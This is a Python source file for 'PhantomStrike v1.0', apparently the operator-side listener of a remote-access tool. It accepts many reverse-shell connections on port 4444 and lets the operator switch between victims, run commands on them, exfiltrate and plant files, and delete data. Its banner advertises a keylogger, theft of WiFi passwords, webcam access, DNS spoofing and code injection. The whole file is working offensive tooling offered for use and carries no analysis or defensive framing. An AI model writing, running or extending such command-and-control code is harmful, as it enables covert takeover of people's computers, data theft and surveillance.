import socket
import selectors
import base64
import json
import select
import os
import sys
import threading
import asyncio
from tqdm import tqdm
class MultiClientListener:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.logo ="""
 ██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████ 
▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ 
▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   
▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ 
▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░
░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░   ░  ░  ░    ░        ░░   ░  ▒ ░░ ░░ ░    ░   
          ░  ░  ░      ░  ░         ░              ░ ░         ░         ░              ░      ░  ░  ░      ░  ░
"""                                                                                              

        self.selector = selectors.DefaultSelector()
        self.clients = {}  # Stores {conn: addr}
        self.client_ids = {}  # Stores {id: conn}
        self.current_client = None  # Active client for command execution
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.format = 'utf-8'
    
    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode(self.format)
        except FileNotFoundError:
            return f"[-]File not found :{path}".encode(self.format)
        except Exception as e:
            return f"[-] File reading file:{str(e)}".encode(self.format)
    
    def clear_screen(self):
        """Clears the terminal screen."""
        os.system('cls' if os.name == 'nt' else 'clear')

        
    def writing_file(self,path,content):
        try:
            with open(path,'wb') as file:
                file.write(base64.b64decode(content))
            return "[+] download  successfully"
        except Exception as e:
            return f"{e} this occured while receiving data"
    def start_listener(self):
        """Starts the multi-client reverse shell listener."""
        print(self.logo)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)

        self.selector.register(server, selectors.EVENT_READ, data=None)
        print(f"[*] Listening for incoming connections on {self.host}:{self.port}...")
        print("[*] Run help to see how to use this tool ")
        print("\n")
        print("                         PhantomStrike v1.0                        ")
        print("\n")
        print("                =[       List of payload                    ]       ")
        print("                =[       ---------------                    ]       ")
        print("                =[       Downloading file                   ]       ")
        print("                =[       Uploading file                     ]       ")
        print("                =[       Deleting file                      ]       ")
        print("                =[       Executing command on cmd           ]       ")
        print("                =[       Keylogger                          ]       ")
        print("                =[       Copying wifi password to Usb       ]       ")
        print("                =[       Opening webCam                     ]       ")
        print("                =[       DNS spoofer                        ]       ")
        print("                =[       Code Injector                      ]       ")
        print("                =[       More ...                           ]       " )
        print("\n")
        try:
            while True:
                events = self.selector.select(timeout=1)  # Non-blocking select
                for key, mask in events:
                    if key.data is None:
                        self.accept_client(key.fileobj)
                    else:
                        self.handle_client(key, mask)
                self.global_command_loop()
              # Handle interactive shell
        except KeyboardInterrupt:
            print("\n[!] Shutting down listener.")
        finally:
            self.selector.close()
            self.server.close()


    def global_command_loop(self):
        """Handles global commands, allowing switching between clients."""
        if not self.current_client:
            command = input("shell>> ").strip()  # ✅ Fix: Always ask for input
            command = command.split(" ")
            if command[0].lower() == "list":
                self.list_clients()

            elif command[0] == "exit":
                self.server.close()
                sys.exit()
            elif command[0].lower()=="switch":
                try:
                    client_id = command[1]
                    self.switch_client(int(client_id))
                except Exception as e:
                    print(f'[-] Error "{e}"')
            elif command[0].lower() == "help":
                print("commands       Description")
                print("--------       -----------")
                print("CTRL + C       Exit Forcibly")
                print("exit           Exiting the shell")
                print("switch <id>    switching from one client id to another")
                print("exit           to exit form any client interpreter")
                print("list           list all client connected.\n")
                print("For more information on tools see the command-line reference on the github page.")


            else:
                print("[-] No client selected. Use 'list' and 'switch <id>'.")
        else:
            command = input(f"[Client {self.current_client}] Shell> ")
            command = command.split(" ")
            self.command_loop(command)  # Send command to the selected client


    def receiving_data(self, conn):
        json_data = ""
        while True:
            try:
                ready, _, _ = select.select([conn], [], [], 1)  # Wait up to 1 second for data
                if ready:
                    json_data += conn.recv(1024).decode(self.format)
                    return json.loads(json_data)  # Successfully received full data
                else:
                    return None  # No data received, return None
            except json.JSONDecodeError:
                continue  # Keep receiving until a full JSON message is obtained
            except BlockingIOError:
                continue  # Ignore and retry until data is available
            except ConnectionResetError:
                print("[!] Client forcibly closed the connection.")
                self.disconnect_client(conn, self.current_client)
                return None


    def accept_client(self, server_sock):
        """Accepts a new client connection."""
        conn, addr = server_sock.accept()
        client_id = len(self.clients) + 1
        self.clients[conn] = addr
        self.client_ids[client_id] = conn

        self.selector.register(conn, selectors.EVENT_READ, data=client_id)
        print(f"[+] Client {client_id} connected from {addr}")

    def handle_client(self, key, mask):
        """Handles incoming data from clients."""
        conn = key.fileobj
        client_id = key.data

        if mask & selectors.EVENT_READ:
            try:
                data = self.receiving_data(conn)
                if data:
                    print(f"\n[Client {client_id}] {data}")
                else:
                    self.disconnect_client(conn, client_id)
            except BlockingIOError:
                pass
            except ConnectionResetError:
                self.disconnect_client(conn, client_id)


    def sending_data(self, data):
        """Send data to the currently selected client."""
        if not self.current_client:
            print("[-] No client selected. Use 'list' and 'switch <id>'.")
            return
        
        conn = self.client_ids.get(self.current_client)  # Get the selected client's socket
        if not conn:
            print(f"[-] Client {self.current_client} is no longer connected.")
            self.current_client = None
            return

        try:
            if isinstance(data, bytes):
                data = base64.b64encode(data).decode(self.format)
            json_data = json.dumps(data)
            conn.send(json_data.encode(self.format))  # ✅ Send to the selected client socket
        except BrokenPipeError:
            print(f"[!] Client {self.current_client} disconnected unexpectedly.")
            self.disconnect_client(conn, self.current_client)




    def disconnect_client(self, conn, client_id):
        """Removes a disconnected client."""
        if conn in self.clients:
            print(f"[-] Client {client_id} disconnected.")
            self.selector.unregister(conn)
            conn.close()
            self.clients.pop(conn, None)  # ✅ Avoids KeyError
            self.client_ids.pop(client_id, None)

            if self.current_client == client_id:
                self.current_client = None

    
    def upload_file(self,conn,file_path):
        if not os.path.exists(file_path):
            print("[-] File not found")
            return

        # Send file name and size first
        file_size = os.path.getsize(file_path)
        self.sending_data(f"upload {os.path.basename(file_path)} {file_size}")

        # Send file data in chunks with progress bar
        progress = tqdm(total=file_size, unit="B", unit_scale=True, desc="Uploading")
        with open(file_path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                conn.send(chunk)
                progress.update(len(chunk))
        progress.close()
        print(f"[+] File uploaded: {os.path.basename(file_path)}")
    async def exiting_connection(self,command):
        self.current_client = None
        self.sending_data(command)
    
    def command_loop(self, command):
        """Handles commands for the selected client."""
        conn = self.client_ids.get(self.current_client)

        if command[0] in ["exit", "quit"]:
            # Send data immediately
            self.sending_data(command)
            self.disconnect_client(conn, self.current_client)
            self.current_client = None


        elif command[0] == "list":
            self.list_clients()

        elif command[0] =="switch":
            client_id = command[2]
            self.switch_client(int(client_id))
        elif command[0] == 'clear':
            self.clear_screen()
        elif command[0] == "download":
            self.sending_data(command)
            data = self.receiving_data(conn)
            if data:
                file_name = command[1]
                self.writing_file(file_name, data)
                print(f"[+]received file content : {file_name}")
            else:
                 print("No data received from client.")
        elif command[0] == "delete":
            self.sending_data(command)
            self.delete_files(command[1])

        elif command[0] == "upload":
            self.upload_file(conn,command[1])
        else:
            if conn:
                self.sending_data(command)

    def list_clients(self):
        """Lists all connected clients."""
        print("\n[Active Clients]")
        for client_id, conn in self.client_ids.items():
            print(f"Client {client_id}: {self.clients[conn]}")
        print("\n")
    def delete_files(self,file_name):
        self.sending_data(file_name)
        
    def switch_client(self, client_id):
        """Switches control to a different client."""
        if client_id in self.client_ids:
            print(f"[+] Switched to Client {client_id}")
            self.current_client = client_id
        else:
            print("[-] Invalid client ID.")

if __name__ == "__main__":
    listener = MultiClientListener()
    listener.start_listener()